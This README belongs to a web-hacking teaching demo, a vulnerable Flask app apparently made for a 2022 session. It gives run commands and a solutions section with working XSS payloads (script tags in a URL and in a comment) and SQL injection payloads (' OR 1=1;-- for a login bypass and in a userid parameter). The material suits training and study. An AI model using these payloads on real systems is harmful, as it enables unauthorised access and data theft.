# Web-Hacking-2022
Web Hacking demo for SESH, 2022 edition!

## Run

### Windows

```
PS > cd .\app\
PS > $env:FLASK_APP = "app"
PS > $env:FLASK_DEBUG = "true"
PS > python -m flask run
```

OR run app.py

## Solutions

### XSS 1

`/xss1?flavour=chocolate&quantity=%3Cscript%3Ealert(%27ello%27)%3C/script%3E`

### XSS 3

Just post a comment with the contents `<script>alert('xss')</script>`

### SQL 1

Classic payload: login with `' OR 1=1;--`

### SQL 2

Note: this challenge is also technically an IDOR, as if you know the admin's username (admin) you can view their profile.

`http://localhost:5000/sqli2/getuserdata?userid=71PEO4MZZ145ICYR%27%20OR%201=1;--`